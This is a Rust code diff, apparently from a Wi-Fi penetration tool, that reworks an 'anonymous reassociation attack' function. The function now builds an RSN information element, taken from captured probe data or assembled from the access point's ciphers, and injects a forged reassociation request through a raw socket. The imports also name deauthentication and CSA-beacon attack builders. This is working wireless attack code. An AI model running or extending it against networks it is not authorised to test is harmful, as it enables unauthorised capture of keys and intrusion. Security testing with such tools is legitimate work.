@@ -7,7 +7,7 @@ use std::{
 
 use libwifi::{
     frame::{
-        components::{MacAddress, RsnCipherSuite},
+        components::{MacAddress, RsnAkmSuite, RsnCipherSuite, RsnInformation},
         Beacon, DeauthenticationReason, ProbeRequest,
     },
     parse_frame, Addresses, Frame,
@@ -19,8 +19,8 @@ use crate::{
     tx::{
         build_association_request_rg, build_authentication_frame_noack, build_csa_beacon,
         build_deauthentication_fm_ap, build_deauthentication_fm_client,
-        build_disassocation_from_ap, build_disassocation_from_client,
-        build_probe_response, build_reassociation_request,
+        build_disassocation_from_ap, build_disassocation_from_client, build_probe_response,
+        build_reassociation_request,
     },
     write_packet, OxideRuntime,
 };
@@ -473,20 +473,49 @@ pub fn anon_reassociation_attack(
         return Ok(());
     }
 
-    let pcs = if ap.information.cs_ccmp.is_some_and(|x| x) {
-        RsnCipherSuite::CCMP
-    } else if ap.information.cs_tkip.is_some_and(|x| x) {
-        RsnCipherSuite::TKIP
+    let rsn = if ap
+        .pr_station
+        .clone()
+        .is_some_and(|station| station.rsn_information.is_some())
+    {
+        ap.pr_station
+            .clone()
+            .unwrap()
+            .rsn_information
+            .unwrap()
+            .clone()
     } else {
-        return Ok(());
-    };
+        let pairwise_cipher_suites = if ap.information.cs_ccmp.is_some_and(|x| x) {
+            vec![RsnCipherSuite::CCMP]
+        } else if ap.information.cs_tkip.is_some_and(|x| x) {
+            vec![RsnCipherSuite::TKIP]
+        } else {
+            return Ok(());
+        };
 
-    let gcs = if ap.information.gs_ccmp.is_some_and(|x| x) {
-        RsnCipherSuite::CCMP
-    } else if ap.information.gs_tkip.is_some_and(|x| x) {
-        RsnCipherSuite::TKIP
-    } else {
-        return Ok(());
+        let group_cipher_suite = if ap.information.gs_ccmp.is_some_and(|x| x) {
+            RsnCipherSuite::CCMP
+        } else if ap.information.gs_tkip.is_some_and(|x| x) {
+            RsnCipherSuite::TKIP
+        } else {
+            return Ok(());
+        };
+        RsnInformation {
+            version: 1,
+            group_cipher_suite,
+            pairwise_cipher_suites,
+            akm_suites: vec![RsnAkmSuite::PSK],
+            mfp_required: false,
+            pre_auth: false,
+            no_pairwise: false,
+            ptksa_replay_counter: 0,
+            gtksa_replay_counter: 0,
+            mfp_capable: true,
+            joint_multi_band_rsna: false,
+            peerkey_enabled: false,
+            extended_key_id: false,
+            ocvc: false,
+        }
     };
 
     // Send a (anonymous) reassociation request to the AP
@@ -495,8 +524,7 @@ pub fn anon_reassociation_attack(
         &MacAddress::broadcast(),
         ap.ssid.clone(),
         oxide.counters.sequence3(),
-        gcs,
-        vec![pcs],
+        rsn,
     );
     let _ = write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx);
 
